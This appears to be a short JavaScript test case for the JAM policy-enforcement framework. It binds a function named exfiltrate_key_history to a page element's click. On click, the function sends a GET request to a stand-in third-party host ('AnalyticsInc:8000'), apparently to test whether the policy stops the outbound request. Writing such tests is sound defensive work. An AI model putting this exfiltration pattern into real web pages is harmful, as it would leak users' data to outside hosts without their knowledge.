
JAM.startProfile('load');
function exfiltrate_key_history(){newreq=XMLHttpRequest;xmlhttp=new newreq;JAM.call(JAM.get(xmlhttp,"open",JAM.policy.p1),xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=clone4",!0]);xmlhttp.send(null)}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)

JAM.stopProfile('load');
